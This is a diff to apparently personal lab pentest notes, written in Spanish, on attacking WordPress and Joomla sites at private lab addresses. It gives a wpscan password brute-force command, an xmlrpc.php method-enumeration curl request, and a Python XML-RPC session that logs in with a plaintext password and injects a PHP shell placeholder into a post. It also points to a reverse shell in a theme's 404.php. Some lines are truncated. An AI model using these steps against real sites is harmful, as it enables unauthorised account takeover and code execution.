@@ -6,8 +6,35 @@ http://10.10.33.156/language/en-GB/en-GB.xml
 joomscan -u http://IP
 
 # wordpress
-# xmlrpc.php brute force
-https://www.youtube.com/watch?v=t4QW23rctcI&t=1398s
-
 # php reverse shell
 http://10.10.186.7/blog/wp-content/themes/twentyseventeen/404.php
+
+# brute-force
+wpscan --url http://10.10.166.70/wordpress/ --usernames support --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+
+# wordpress xmlrpc.php enumeration
+http://10.10.168.124/wordpress/xmlrpc.php --> habilitado en wordpress
+curl -s -X POST 'http://10.10.168.124/wordpress/xmlrpc.php' -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCal>' # lista los metodos
+
+pip3 install python-wordpress-xmlrpc
+
+# conectando al wordpress
+p3> from wordpress_xmlrpc import Client
+p3> from wordpress_xmlrpc.methods import posts
+p3> client = Client('http://10.10.168.124/wordpress/xmlrpc.php', 'support', 'ImAScammerLOL!123!')
+
+# listando los posts
+p3> post = client.call(posts.GetPosts())
+p3> post
+[<WordPressPost: b'Hello world!'>]
+p3> dir(post[0])
+['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init_>
+p3> post[0].link
+['/wordpress/index.php/index.php/2021/05/29/hello-world/']
+p3> post[0].content
+['<!-- wp:paragraph -->\n<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>\n<!-- /wp:paragraph -->']
+
+# injectando post malicioso
+p3> malicious_post = post[0]
+p3> malicious_post.content = ['<!-- wp:paragraph -->\n<p>Welcome to WordPress. This is your first post. <?php SHELL ?> Edit or delete it, then star>
+p3> client.call(posts.EditPost(malicious_post.id, malicious_post ))
